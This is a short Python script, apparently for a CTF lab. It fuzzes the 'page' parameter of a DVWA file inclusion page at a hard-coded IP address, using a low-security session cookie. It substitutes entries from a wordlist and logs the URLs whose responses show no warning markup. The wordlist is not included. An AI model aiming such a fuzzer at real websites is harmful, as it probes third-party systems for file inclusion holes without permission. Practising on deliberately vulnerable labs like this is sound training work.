#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
Author: Elmerson Portugal Carpio
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin


lineas = []
cookie = {"PHPSESSID": "kbtprvc2mar5f7f2qs7vjqv5n3", "security": "low"}


def check_url(url):
    """Función para verificar si la URL es válida y contiene la cadena FUZZ"""

    o = urlparse(url)
    if o.scheme == "http" or o.scheme == "https":
        s = o.query
        s = s.replace("=", " ")
        mylist = s.split(" ")
        valor = mylist[1:]
        if valor[0] == "FUZZ":
            return True
        else:
            return False
    else:
        print("url incorrecta")


def load_payloads(filename):
    """Función para cargar los payloads desde un archivo"""

    global lineas
    with open(filename, "r") as stop_words:
        lineas = [linea.strip() for linea in stop_words]


def fuzz(url):
    """Función para hacer fuzzing"""

    o = urlparse(url)
    s = o.query

    for linea in lineas:
        p = s.replace("FUZZ", linea)
        x = p.replace("page", "?page")
        newURL = urljoin(o.geturl(), x)
        check_response(newURL)
        s = s.replace(linea, "FUZZ")
        newURL = urljoin(o.geturl(), x)


def check_response(response):
    """Función para verificar la respuesta de la URL"""

    print(response)
    responsef = requests.get(response, cookies=cookie)
    soup = BeautifulSoup(responsef.content, "html.parser")

    if soup.find_all("b"):
        print("Warning")
    else:
        export_data("URLs.txt", response)


def export_data(file_name, data):
    """Función para exportar los datos a un archivo"""

    url = open(file_name, "a")
    url.write(f"\n{data}")
    url.close()


def main():
    """Función principal"""

    url = "http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=FUZZ"
    if check_url(url):
        load_payloads("Wordlist.txt")
        fuzz(url)


if __name__ == "__main__":
    main()

